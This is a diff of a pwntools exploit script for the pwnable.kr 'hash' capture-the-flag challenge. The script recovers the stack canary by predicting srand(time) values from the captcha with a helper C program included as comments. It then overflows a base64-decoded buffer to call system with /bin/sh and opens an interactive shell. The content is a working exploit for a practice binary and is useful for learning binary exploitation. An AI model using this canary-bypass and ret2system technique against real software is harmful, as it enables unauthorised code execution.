@@ -1,34 +1,58 @@
 from pwn import *
 from pwnlib.util.packing import p32
+import os, time
 
-p = remote('pwnable.kr', 9002)
+# p = remote('pwnable.kr', 9002)
+p = process("./hash")
 p.recvuntil("input captcha : ")
 captcha = p.recvline().strip()
+t = int(time.time())
 
 # calculate canary
-
-p.send(captcha)
-print(captcha)
-
+canary = "0x"+os.popen("./cal_can %s %s"%(t, captcha)).read().strip()
+print(canary)
+canary = int(canary, 16)
+p.sendline(captcha)
 
 p.recvuntil("Encode your data with BASE64 then paste me!\n")
 # stack smash
-# 0xaa is the boundary
-# 0x2aa = 0x200 length (including a trailing 0000
-p.sendline("QUFB"*0xab)
+payload = b'A'*0x200
+payload += p32(canary)
 
-print(p.recvall())
+sys_addr = 0x08049187
+g_buf = 0x804b0e0
+payload += b'B'*0xc
+payload += p32(sys_addr)
+payload += p32(g_buf + 0x2cc)
 
-# base = int.from_bytes(putchar, "little") - libc.symbols['putchar']
+payload = b64e(payload)
+payload += "/bin/sh\x00"
+print(payload)
+p.sendline(payload)
 
-# p.interactive()
+p.interactive()
 p.close()
 
 # pwn
-# Base64Decode -> var_20ch
-# cal_md5 <- var_20ch
-    # -> eax -> var_210h
+# input takes 0x400 while Base64decode takes 0x200. Overflowed
+# encode payload before sending
+# need to get around canary
+# The captcha leaks the canary by adding canary and srand(time)
+# Get the time() by running code in pwnable server
+# /bin/sh don't need encoding
 
-# could be var_20c overwriting stack addr in decode or cal_md5
-# the var_20c ,,, curious why from 2ac*A the stack is smashed
-# could it be captcha related? like srand?
+# aux c code
+# #include<stdio.h>
+# #include<stdlib.h>
+# #include<assert.h>
+# int main(int argc, char **argv) 
+# {
+  # assert(argc==3);
+  # int m = atoi(argv[2]);
+  # int rands[8];
+  # srand(atoi(argv[1]));
+  # for (int i = 0; i <= 7; i++) rands[i] = rand();
+  # m -= rands[1] + rands[2] - rands[3] + rands[4] + rands[5] - rands[6] + rands[7];
+  # printf("%x\n", m);
+  # return 0;
+# }
